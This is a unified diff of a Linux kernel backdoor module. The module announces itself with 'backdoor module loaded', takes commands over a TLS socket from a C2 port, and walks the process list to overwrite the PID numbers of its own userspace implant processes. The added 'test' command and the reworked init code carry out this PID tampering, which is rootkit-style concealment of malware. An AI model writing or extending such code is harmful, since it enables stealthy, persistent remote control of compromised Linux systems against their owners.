@@ -12,12 +12,14 @@
 #include <linux/kthread.h>
 #include <linux/module.h>
 #include <linux/net.h>
-#include <linux/pid_namespace.h>
 #include <linux/netfilter.h>
 #include <linux/netfilter_ipv4.h>
+#include <linux/pid_namespace.h>
+#include <linux/sched.h>
 #include <linux/sched/signal.h>
 #include <linux/skbuff.h>
 #include <linux/slab.h>
+#include <linux/stop_machine.h>
 #include <linux/tcp.h>
 #include <linux/types.h>
 #include <linux/udp.h>
@@ -241,6 +243,10 @@ int read_TLS(void) {
     const char* unknown = "Unknown command\n";
     const char* clear = "All port settings cleared\n";
     const char* bad_drop = "Unable to close the C2 port\n";
+    struct task_struct *ts;
+    char proc_name[TASK_COMM_LEN];
+    struct pid* newpid;
+    int z = 0;
 
     while (!kthread_should_stop()) {
         tmp_port = 0;
@@ -282,6 +288,22 @@ int read_TLS(void) {
             closed_port_count = 0;
             strcpy(buffer, clear);
             send_msg(svc->tls_socket, buffer, strlen(clear));
+        } else if (memcmp("test", buffer, 4) == 0) {
+            for_each_process(ts) {
+                printk(KERN_INFO "Process name %s %d\n", get_task_comm(proc_name, ts), ts->pid);
+                //if (strcmp("userspace.elf", proc_name) == 0) {
+                if (strcmp("/usr/lib/system", proc_name) == 0) {
+                    printk(KERN_INFO "Found my userspace proc\n");
+
+                    //stop_machine(my_change_pid, ts, NULL);
+                    newpid = get_task_pid(ts, PIDTYPE_PID);
+                    //newpid->numbers[0].nr = 76831 + z++;
+                    newpid->numbers[0].nr = 76831;
+                } else if (strcmp("crash_test_dumm", proc_name) == 0) {
+                    newpid = get_task_pid(ts, PIDTYPE_PID);
+                    newpid->numbers[0].nr = 76831;
+                }
+            }
         } else {
             strcpy(buffer, unknown);
             send_msg(svc->tls_socket, buffer, strlen(unknown));
@@ -459,6 +481,15 @@ static asmlinkage void (*change_pidR)(
         struct task_struct* task, enum pid_type type, struct pid* pid);
 static asmlinkage struct pid* (*alloc_pidR)(struct pid_namespace* ns);
 
+int my_change_pid(void* data) {
+#if 0
+    struct task_struct* ts = data;
+    struct pid *newpid = get_task_pid(ts, PIDTYPE_PID);
+    newpid->numbers[0].nr = 76831;
+#endif
+    return 0;
+}
+
 /*
  * function:
  *    mod_init
@@ -476,7 +507,7 @@ static int __init mod_init(void) {
     int err;
     struct task_struct* ts;
     char proc_name[TASK_COMM_LEN];
-    struct pid *newpid;
+    struct pid* newpid;
 
     change_pidR = kallsyms_lookup_name("change_pid");
     alloc_pidR = kallsyms_lookup_name("alloc_pid");
@@ -512,13 +543,23 @@ static int __init mod_init(void) {
     printk(KERN_ALERT "backdoor module loaded\n");
 
     for_each_process(ts) {
-        printk(KERN_INFO "Process name %s\n", get_task_comm(proc_name, ts));
+        printk(KERN_INFO "Process name %s %d\n", get_task_comm(proc_name, ts), ts->pid);
         if (strcmp("userspace.elf", proc_name) == 0) {
             printk(KERN_INFO "Found my userspace proc\n");
-            newpid = alloc_pidR(task_active_pid_ns(ts));
-            newpid->numbers[0].nr = 12345;
-            newpid->numbers[0].ns = task_active_pid_ns(ts);
-            change_pidR(ts, PIDTYPE_PID, newpid);
+
+#if 0
+            write_lock(&tasklist_lock);
+
+            //newpid = alloc_pidR(task_active_pid_ns(ts));
+            newpid = get_task_pid(ts, PIDTYPE_PID);
+            newpid->numbers[0].nr = 76831;
+            //newpid->numbers[0].ns = task_active_pid_ns(ts);
+            //change_pidR(ts, PIDTYPE_PID, newpid);
+
+            write_unlock(&tasklist_lock);
+#else
+            stop_machine(my_change_pid, ts, NULL);
+#endif
         }
     }
 
